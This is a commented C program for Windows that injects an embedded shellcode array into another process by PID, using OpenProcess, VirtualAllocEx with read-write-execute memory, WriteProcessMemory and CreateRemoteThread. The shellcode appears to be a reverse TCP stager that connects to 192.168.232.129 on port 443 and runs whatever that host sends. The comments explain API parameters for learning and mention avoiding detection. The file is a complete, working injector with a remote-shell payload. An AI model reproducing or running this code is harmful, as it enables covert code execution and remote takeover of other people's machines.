#include <windows.h>
#include <stdio.h>
// I did paste the outline for the Windows functions to see the parameters that are being taken in
// Gotta use those macros
//#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
//#define warn(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
//#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
const char* k = "[+]"; // successful indication 
const char* i = "[*]"; // working indication 
const char* e = "[-]"; // error indication 

DWORD PID;
//DWORD is pretty much a 32 bit place holder

HANDLE hProcess = NULL;
HANDLE hThread = NULL;
LPVOID rBuffer = NULL;
unsigned char shellCode[] = "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x48\x31\xd2\x51\x65\x48\x8b\x52\x60\x48\x8b\x52\x18"
"\x48\x8b\x52\x20\x56\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48"
"\x8b\x72\x50\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41"
"\x51\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
"\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x56\x48\xff\xc9\x4d\x31\xc9\x41\x8b\x34\x88"
"\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1"
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x41\x58"
"\x48\x01\xd0\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
"\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
"\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\xe8\x81\x41\x54"
"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
"\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
"\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
"\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
"\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
"\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
"\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
"\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
"\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
"\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
"\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
"\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
"\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\xbb\xe0\x1d"
"\x2a\x0a\x41\x89\xda\xff\xd5";
// "Hungarian" notation used with the h in front because Microsoft adapted that for their variables where it is the variable type of what is being returned

int main(int argc, char* argv[]) {
    

    

    PID = atoi(argv[1]);
    printf("%s Attempting to open proccess handle (%ld)\n", i, PID);
    
    
    /*
    HANDLE OpenProcess(
        [in] DWORD dwDesiredAccess, //Process privilege/rights (If a proccess is protected however, an error will occur when trying to force these privileges)
        [in] BOOL  bInheritHandle, //Do we want to inherit any other proccess that are spawned from this one
        [in] DWORD dwProcessId
    );
    */  

    hProcess = OpenProcess(
                PROCESS_ALL_ACCESS, // Doing all access but best to give the script the minimum required access as to not be detected and just better practice and isf the process is "protected" an error will occur for you won't be able to choose what access is given
                FALSE,  
                PID
                );
    

    if (hProcess == NULL){
        printf("%s Couldn't get (%ld), error %ld", e, PID, GetLastError()); // This will give you the error number that's causing the crash which you can find in the Windows documentation as previously mentioned that explains exactly what is is (EXTREMELY useful for debugging)
        return 1;
    }
    printf("%s Got a handle to the proccess \n\\---0x%p\n", k, hProcess);
    // At this point the handle to the specified proccess has been opened.
    
    
    
    // Time to reserver some of the process memory for our code

    /*
    LPVOID VirtualAllocEx(
        [in]           HANDLE hProcess,
        [in, optional] LPVOID lpAddress,     // Specifics the starting address and where in the memory will be allocated for our use. If NULL the function will determine where to allocate on its own
        [in]           SIZE_T dwSize,        // The size of our shell code (how much to allocate)
        [in]           DWORD  flAllocationType,
        [in]           DWORD  flProtect      // Permission of the memory, if the correct permissions aren't being used the script just won't run
    );
    */

    // The buffer function we're using to allocate space
    rBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        sizeof(shellCode),               // How much space we need for our shell code
        (MEM_COMMIT | MEM_RESERVE),      // The type of allocation and this is how you can use both the reserve type and commit type which is needed to inject
        PAGE_EXECUTE_READWRITE           // Just simple rwx permissions
 
    );
    printf("%s Allocated approximately %zu bytes with rwx permissions\n", k, sizeof(shellCode));






    /*
    BOOL WriteProcessMemory(
        [in]  HANDLE  hProcess,
        [in]  LPVOID  lpBaseAddress,
        [in]  LPCVOID lpBuffer,
        [in]  SIZE_T  nSize,
        [out] SIZE_T  *lpNumberOfBytesWritten   // Don't really have to worry about this rn
    );
    */

    // Time to actually write the memory since we have now allocated the space
    WriteProcessMemory(
        hProcess,
        rBuffer,    // The area of the memory we're writing in
        shellCode,  // Actually writing our shell code into the memory now
        sizeof(shellCode),
        NULL
    ); 

    printf("%s Wrote approximately %zu bytes to the proccess memory\n", k, sizeof(shellCode));





    /*
    HANDLE CreateRemoteThreadEx(
        [in]            HANDLE                       hProcess,
        [in, optional]  LPSECURITY_ATTRIBUTES        lpThreadAttributes,
        [in]            SIZE_T                       dwStackSize,
        [in]            LPTHREAD_START_ROUTINE       lpStartAddress,        //Specifies the starting point for the thread in way, so in other words we'll point this to the buffer we created earlier so it starts at the beginning of our thread 
        [in, optional]  LPVOID                       lpParameter,
        [in]            DWORD                        dwCreationFlags,       //Can change the behavior of the thread like priority or something else
        [in, optional]  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
        [out, optional] LPDWORD                      lpThreadId
    );
    */

    // Lastly time to actually create the thread within the process that will run our newly created memory that contains our scripts
    // Saving this thread to hThread
    hThread = CreateRemoteThread(
        hProcess,
        NULL, 
        0,      //If 0 the thread will just use a default size for the executable 
        (LPTHREAD_START_ROUTINE)rBuffer,    // Points to the function to be executed by the thread
        NULL,
        0,      // 0 means the thread runs immediately after creation
        NULL    // Pointer to receive the thread identifier
    );
    


    if (hThread == NULL){
        printf("%s Failed to get the handle to the thread, error: %ld", e, GetLastError());
        CloseHandle(hProcess);  // If all fails we don't want the handle to stick around
        return 1;
    }

    
    printf("%s Got a handle on the thread \n\\---0x%p", k, 0, hThread);


    /*
    DWORD WaitForSingleObject(
        [in] HANDLE hHandle,
        [in] DWORD  dwMilliseconds
    );
    */

    printf("%s Waiting for the thread to finish\n", i);
    WaitForSingleObject(    //Just letting our thread do it's thing and go through before any other steps
        hThread,
        INFINITE        // INFINITE tells it to wait until the object is signaled, rather than a static time
    );
    printf("%s Thread is now finished\n", i);


    CloseHandle(hThread); // Now that we're done shutting it all down
    CloseHandle(hProcess);

    return 0;
}

